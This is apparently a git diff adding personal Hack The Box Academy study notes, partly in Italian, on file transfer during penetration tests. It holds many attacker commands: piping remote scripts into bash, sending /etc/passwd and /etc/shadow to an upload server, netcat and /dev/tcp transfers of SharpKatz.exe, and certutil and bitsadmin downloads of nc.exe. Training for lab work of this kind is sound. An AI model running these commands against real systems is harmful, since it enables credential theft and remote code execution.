@@ -225,3 +225,294 @@ ftp> USER anonymous
 ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
 ```
+
+
+
+# Linux File Transfer
+
+### Encode file to base64
+`j4k1dibe@htb[/htb]$ cat id_rsa |base64 -w 0;echo`
+
+### Decode file from base64
+`j4k1dibe@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa`
+
+### Download a file using wget
+
+`j4k1dibe@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
+
+### download a file using cURL
+`j4k1dibe@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
+
+### Fileless download and execution using cURL
+`j4k1dibe@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
+
+### Fileless download and execute (python script) using wget
+`j4k1dibe@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
+
+## Download using Bash
+
+### Connect to server 
+`j4k1dibe@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80`
+
+### HTTP GET request
+`j4k1dibe@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
+
+### Print the response
+`j4k1dibe@htb[/htb]$ cat <&3`
+
+## SSH Downloads
+
+### Enabling SSH server
+```
+j4k1dibe@htb[/htb]$ sudo systemctl enable ssh
+j4k1dibe@htb[/htb]$ sudo systemctl start ssh
+```
+
+### Downloading file with scp
+`j4k1dibe@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . `
+
+
+Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.
+
+
+## Web Uploads
+
+`j4k1dibe@htb[/htb]$ sudo python3 -m pip install --user uploadserver` installa estenzione upload server
+
+
+### Create self-signed certificate
+`j4k1dibe@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
+
+### Start Webserver
+`j4k1dibe@htb[/htb]$ mkdir https && cd https`
+
+`j4k1dibe@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem` starto il server con il certificato
+
+### Upload multiple files with cURL
+
+`j4k1dibe@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
+la flag **--insecure** serve perche' il certificato e' auto firmato.
+
+### Creating simple webserver with python3
+`j4k1dibe@htb[/htb]$ python3 -m http.server`
+
+### Creating a webserver with Python2.7
+`j4k1dibe@htb[/htb]$ python3 -m http.server`
+
+### Crating a webserver with PHP
+`j4k1dibe@htb[/htb]$ php -S 0.0.0.0:8000`
+
+### Creating a webserver with Ruby
+`j4k1dibe@htb[/htb]$ ruby -run -ehttpd . -p8000`
+
+### DOwnload the file 
+`j4k1dibe@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt`
+
+
+## SCP Upload
+
+`j4k1dibe@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/` File upload usando SCP.
+
+
+## Transferring file with Code
+
+Spesso si trovano sulle macchine installate linguaggi di programmazione tipo Python, PHP, Perl, and Ruby
+
+### Python
+
+`j4k1dibe@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`, con python2
+
+`j4k1dibe@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`, con python3
+
+### PHP
+
+`j4k1dibe@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
+
+`j4k1dibe@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);`
+
+`j4k1dibe@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
+
+### Ruby
+
+`j4k1dibe@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`
+
+### Perl
+
+`j4k1dibe@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`
+
+### JavaScript
+```
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+
+### Javascript and scscript.exe
+
+`C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`
+
+### VBScript
+```
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+
+### VBScript and cscript.exe
+`C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`
+
+
+### Upload usando python3
+
+`j4k1dibe@htb[/htb]$ python3 -m uploadserver `, creo un webserver
+
+`j4k1dibe@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'` uploadare un file con un one-liner
+
+
+## Miscellaneous File Transfer Methods
+
+### Netcat
+
+`victim@target:~$ nc -l -p 8000 > SharpKatz.exe`. . sulla macchina che sta in ascolto e riceve
+
+`j4k1dibe@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe` sulla macchina che vuole mandare il file
+
+la flag **--send-only** serve a terminare la connessione dopo che si e' mandato il file
+
+### /bin/TCP
+
+`victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe` ricevere un file
+
+
+## Powershell Session File Transfer
+
+We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.
+
+PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
+
+To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.
+
+`PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985`
+
+`PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01`
+
+`PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`
+
+`PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`
+
+## RDP
+
+### Mounting a Linux folder using rdesktop
+`j4k1dibe@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`
+
+### Using xfreerdp
+`j4k1dibe@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`
+
+To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.
+
+# Protected File Transfer
+
+## Using Invoke-AESEncryption.ps1
+puoi scaricare da qui: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
+
+`PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1`
+
+`PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt`. scripta un file con una password
+
+## Using OpenSSL in Linux
+
+`j4k1dibe@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`, encrypt
+
+`j4k1dibe@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`, decrypt
+
+# Catching files over HTTP/S
+
+
+### Create a directory to handle uploaded files
+`j4k1dibe@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
+
+### Change owner to www-data
+`j4k1dibe@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
+
+### Create nginx configuration file
+
+```
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+
+### Symlink per la directory del sito
+`j4k1dibe@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`
+
+
+### Start nginx
+`j4k1dibe@htb[/htb]$ sudo systemctl restart nginx.service`
+
+### verifying errors
+`j4k1dibe@htb[/htb]$ tail -2 /var/log/nginx/error.log`
+`j4k1dibe@htb[/htb]$ ss -lnpt | grep 80`
+`j4k1dibe@htb[/htb]$ ps -ef | grep 2811`
+
+### Remove NginxDefault Configuration
+`j4k1dibe@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default`
+
+### upload using cURL
+`j4k1dibe@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`
+
+`j4k1dibe@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt`
+
+# Living-Off-The-Lands
+
+https://gtfobins.github.io/
+https://lolbas-project.github.io/
+
+## LOLBAS
+To search for download and upload functions in LOLBAS we can use **/download** or **/upload**.
+
+### Upload a file with certreq.exe
+`C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini`
+
+### File received with netcat
+`j4k1dibe@htb[/htb]$ sudo nc -lvnp 8000`
+
+## GTFOBins
+To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.
+
+### Create a certificate
+`j4k1dibe@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`
+
+## FileDownload with BITS
+
+`PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe`
+
+`PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"`
+
+## FileDownload with certutil.exe
+
+`C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe`
+
+## Detection
+
+Sembra figa. non ho voglia
+https://academy.hackthebox.com/module/24/section/162
+
